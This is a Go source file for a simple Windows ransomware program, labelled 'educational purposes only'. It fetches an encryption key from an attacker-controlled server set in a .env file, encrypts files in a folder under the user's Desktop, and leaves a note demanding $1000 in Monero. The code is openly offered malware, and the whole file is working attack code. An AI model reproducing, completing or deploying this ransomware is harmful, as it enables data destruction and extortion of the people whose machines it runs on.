/*
	Author: Alcid3s

	This software is strictly for educational purposes only. The author is not responsible for any damage caused by this software.
	A simple ransomware for windows that encrypts the files on the home folder of the user.
*/

package disappointedPickle

import (
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"path/filepath"
	"runtime"

	"github.com/joho/godotenv"
	"ransomware.com/main/internal/ransomware"
)

const Version = "1.0"
const Statement = "Your files have been encrypted. To decrypt them, send $1000 worth in XMR to the following address: 1BvBMSEYstWetqTFn5Au4m4GFg7xJaNVN2"

var outputFilename string

func disappointedPickle() {

	if runtime.GOOS != "windows" {
		fmt.Println("Windows is required to run this ransomware. Exiting...")
		return
	}

	// check if ransomware was already executed
	_, err := os.Stat(filepath.Join(os.Getenv("USERPROFILE"), "Desktop//READMYPICKLE.txt"))
	if err == nil {
		os.Exit(0)
	}

	err = godotenv.Load()
	if err != nil {
		log.Fatal("Error loading .env file")
	}

	ipaddr := os.Getenv("IP_ADDRESS")
	port := os.Getenv("PORT")

	resp, err := http.Get("http://" + ipaddr + ":" + port + "/createkey")
	if err != nil {
		fmt.Println("Error getting key:", err)
		return
	}
	defer resp.Body.Close()

	key, err := io.ReadAll(resp.Body)
	if err != nil {
		fmt.Println("Error reading key:", err)
		return
	}

	ransomware.ExecuteRansom(filepath.Join(os.Getenv("USERPROFILE"), "Desktop//songs"), key)

	// overwrite key
	key = make([]byte, 64)

	if key == nil {
		os.Exit(1)
	}

	os.WriteFile(filepath.Join(os.Getenv("USERPROFILE"), "Desktop//READMYPICKLE.txt"), []byte(Statement), 0644)
}
